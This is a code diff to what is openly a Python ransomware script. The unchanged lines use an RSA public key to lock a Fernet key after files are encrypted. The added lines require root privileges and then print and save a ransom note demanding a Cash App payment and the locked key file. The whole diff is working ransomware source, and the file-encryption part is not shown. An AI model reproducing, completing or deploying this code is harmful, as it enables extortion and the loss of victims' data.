@@ -1,7 +1,13 @@
 import os
 import rsa
 from cryptography.fernet import Fernet
+import sys
 
+# Checks if program is being run as sudo 
+if os.geteuid() != 0: 
+     print("Please run this with sudo in order for the process to work!")
+     sys.exit(1)
+     
 # Asymmetric public key used to lock the fernet key after files have been encrypted
 public_key_pem = """
 -----BEGIN RSA PUBLIC KEY-----
@@ -55,3 +61,9 @@ with open('fernet_key', 'rb') as f:
 encrytped_data = rsa.encrypt(data, public_key)
 with open('fernet_key', 'wb') as f:
         f.write(encrytped_data)
+
+
+# Ransomnote
+print("Your system has been encrypted by the 1337 H@xors, to recover your files refer to hacked.txt")
+with open("Hacked.txt", "w") as f:
+     f.write("Your systems has beec comrpomised. To recover your data send $5 to H@x0r5 on cashapp along with the contents of the file fernet_key. From there we will decrypt the key and allow you to unencrypt your data. >:)")
